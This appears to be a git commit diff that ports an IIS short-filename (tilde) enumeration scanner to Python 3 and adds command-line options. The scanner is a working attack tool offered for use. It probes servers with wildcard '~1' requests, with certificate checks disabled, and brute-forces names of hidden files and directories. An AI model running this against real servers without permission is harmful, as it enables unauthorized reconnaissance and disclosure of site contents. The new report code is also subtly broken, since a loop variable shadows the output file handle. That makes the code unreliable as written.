0f20426b363b6d9fc49982b7cf51b9ecc51dbccf
Yasaki <74845190+haokanako@users.noreply.github.com>
2023-11-07 21:52:18 +0800

    Update iisScanIIS10_Exp.py
    增加命令行参数 线程输出文件之类，更新为python3 ,

--- iisScanIIS10_Exp.py
+++ iisScanIIS10_Exp.py
@@ -1,108 +1,104 @@
-# encoding=gbk
-# An IIS short_name scanner   my[at]lijiejie.com  http://www.lijiejie.com    
-# Modified by ABC_123
-
-import Queue
-import httplib
+import queue
+import http.client
 import string
 import sys
 import threading
 import time
-import urlparse
+import urllib.parse
 import ssl
+import argparse
 
-class Scanner():
-    def __init__(self, target):
+class Scanner:
+    def __init__(self, target, timeout, threads, result_file):
         self.target = target
-        self.scheme, self.netloc, self.path, params, query, fragment = \
-            urlparse.urlparse(target)
-        if self.path[-1:] != '/':  # ends with slash
+        self.timeout = timeout
+        self.threads = threads
+        self.result_file = result_file
+        self.scheme, self.netloc, self.path, params, query, fragment = urllib.parse.urlparse(target)
+        if not self.path.endswith('/'):
             self.path += '/'
         self.payloads = list('abcdefghijklmnopqrstuvwxyz0123456789_-')
         self.files = []
         self.dirs = []
-        self.queue = Queue.Queue()
+        self.queue = queue.Queue()
         self.lock = threading.Lock()
-        self.threads = []
+        self.threads_list = []
 
     def _conn(self):
         try:
             if self.scheme == 'https':
-                conn = httplib.HTTPSConnection(self.netloc,context=ssl._create_unverified_context())
+                conn = http.client.HTTPSConnection(self.netloc, context=ssl._create_unverified_context())
             else:
-                conn = httplib.HTTPConnection(self.netloc)
+                conn = http.client.HTTPConnection(self.netloc)
             return conn
-        except Exception, e:
-            print '[Exception in function _conn]', e
+        except Exception as e:
+            print('[Exception in function _conn]', e)
             return None
 
-    # fetch http response status code
     def _get_status(self, path):
-
-        for i in range(0, 3):
+        for i in range(3):
             try:
                 conn = self._conn()
                 conn.request('OPTIONS', path)
                 status = conn.getresponse().status
                 conn.close()
                 return status
-            except Exception, e:
-                print '[Exception in function _get_status]', e
+            except Exception as e:
+                print('[Exception in function _get_status]', e)
                 time.sleep(3)
-                # raise Exception('[Exception in function _get_status] %s' % str(e))
 
-    # test weather the server is vulerable
-    def is_vul(self):
+    def is_vulnerable(self):
         try:
-            status_1 = self._get_status(self.path + '/*~1****/a.aspx')  # an existed file/folder
-            status_2 = self._get_status(self.path + '/l1j1e*~1****/a.aspx')  # not existed file/folder
+            status_1 = self._get_status(self.path + '/*~1****/a.aspx')
+            status_2 = self._get_status(self.path + '/l1j1e*~1****/a.aspx')
             if status_1 == 404 and status_2 == 200:
                 return True
             return False
-        except Exception, e:
-            raise Exception('[Exception in function is_val] %s' % str(e))
+        except Exception as e:
+            raise Exception('[Exception in function is_vulnerable] %s' % str(e))
 
     def run(self):
-        # start from root path
         for payload in self.payloads:
-            self.queue.put((self.path + payload, '****'))  # filename, extention
-        for i in range(10):
+            self.queue.put((self.path + payload, '****'))
+        for _ in range(self.threads):
             t = threading.Thread(target=self._scan_worker)
-            self.threads.append(t)
+            self.threads_list.append(t)
             t.start()
 
     def report(self):
-        for t in self.threads:
+        for t in self.threads_list:
             t.join()
         self._print('-' * 64)
-        for d in self.dirs:
-            self._print('Dir:  ' + d)
-        for f in self.files:
-            self._print('File: ' + f)
-        self._print('-' * 64)
-        self._print('%d Directories, %d Files found in toal' % (len(self.dirs), len(self.files)))
+        with open(self.result_file, 'w') as f:
+            for d in self.dirs:
+                if "Done" in d:
+                    f.write('Dir:  ' + d + '\n')
+            for f in self.files:
+                if "Done" in f:
+                    f.write('File: ' + f + '\n')
+        self._print('%d Directories, %d Files found in total' % (len(self.dirs), len(self.files)))
 
     def _print(self, msg):
         self.lock.acquire()
-        print msg
+        print(msg)
         self.lock.release()
 
     def _scan_worker(self):
         while True:
             try:
-                url, ext = self.queue.get(timeout=6)
+                url, ext = self.queue.get(timeout=self.timeout)
                 status = self._get_status(url + '*~1' + ext + '/1.aspx')
                 if status == 404:
                     self._print('Found ' + url + ext + '\t[scan in progress]')
 
-                    if len(url) - len(self.path) < 6:  # enum first 6 chars only
+                    if len(url) - len(self.path) < 6:
                         for payload in self.payloads:
                             self.queue.put((url + payload, ext))
                     else:
-                        if ext == '****':  # begin to scan extention
+                        if ext == '****':
                             for payload in string.ascii_lowercase:
                                 self.queue.put((url, '*' + payload + '**'))
-                            self.queue.put((url, ''))  # also it can be a folder
+                            self.queue.put((url, ''))
                         elif ext.count('*') == 3:
                             for payload in string.ascii_lowercase:
                                 self.queue.put((url, '*' + ext[1] + payload + '*'))
@@ -110,26 +106,27 @@ class Scanner():
                             for payload in string.ascii_lowercase:
                                 self.queue.put((url, '*' + ext[1] + ext[2] + payload))
                         elif ext == '':
-                            self.dirs.append(url + '~1')
-                            self._print('Found Dir ' + url + '~1\t[Done]')
-
+                            self.dirs.append(url + '~1\t[Done]')
                         elif ext.count('*') == 1:
-                            self.files.append(url + '~1.' + ext[1:])
-                            self._print('Found File ' + url + '~1.' + ext[1:] + '\t[Done]')
-            except Exception, e:
+                            self.files.append(url + '~1.' + ext[1:] + '\t[Done]')
+            except Exception as e:
                 break
 
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(description='IIS Short Name Scanner')
+    parser.add_argument('target', help='Target URL')
+    parser.add_argument('--timeout', type=int, default=6, help='Timeout for requests')
+    parser.add_argument('--threads', type=int, default=10, help='Number of threads')
+    parser.add_argument('--result-file', default='results.txt', help='File to save results')
+    args = parser.parse_args()
 
-if len(sys.argv) == 1:
-    print 'Usage: %s target' % sys.argv[0]
-    sys.exit()
+    target = args.target
+    scanner = Scanner(target, args.timeout, args.threads, args.result_file)
 
-target = sys.argv[1]
-s = Scanner(target)
-if not s.is_vul():
-    print 'Sorry, server is not vulerable'
-    sys.exit(0)
+    if not scanner.is_vulnerable():
+        print('Sorry, the server is not vulnerable')
+        sys.exit(0)
 
-print 'server is vulerable, please wait, scanning...'
-s.run()
-s.report()
+    print('Server is vulnerable, please wait, scanning...')
+    scanner.run()
+    scanner.report()
